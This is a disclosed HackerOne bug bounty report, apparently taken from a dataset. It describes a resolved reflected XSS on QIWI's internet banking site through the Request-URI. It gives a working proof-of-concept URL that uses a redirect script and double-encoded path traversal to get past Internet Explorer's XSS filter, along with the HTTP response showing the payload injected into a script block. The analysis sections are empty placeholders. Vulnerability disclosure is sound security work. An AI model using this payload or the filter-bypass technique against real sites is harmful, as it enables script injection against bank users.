---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '164152'
original_report_id: '164152'
title: '[ibank.qiwi.ru] XSS via Request-URI'
weakness: Cross-site Scripting (XSS) - Generic
team_handle: qiwi
created_at: '2016-08-29T12:34:33.385Z'
disclosed_at: '2018-11-18T07:25:16.447Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 15
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# [ibank.qiwi.ru] XSS via Request-URI

## Metadata

- HackerOne Report ID: 164152
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: qiwi
- Disclosed At: 2018-11-18T07:25:16.447Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**PoC** (Internet Explorer и, может быть, Edge)
```
https://blackfan.ru/x?r=https://ibank.qiwi.ru/xx'-alert(document.domain)-'xx/%252e%252e/web_banking/session_timeout.jsf
```
blackfan.ru/x?r простой скрипт перенаправления, необходимый для формирования Request-URI и обхода XSS фильтра IE.

**HTTP Response**
```
    <script type="text/javascript">
//<![CDATA[
var lang='ru';var calendarStartYear='';var colorPickerImage="/web_banking/javax.faces.resource/color.png.jsf?ln=images";var contextPath='/xx'-alert(document.domain)-'xx/%2e%2e/web_banking';
//]]>
</script>
```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
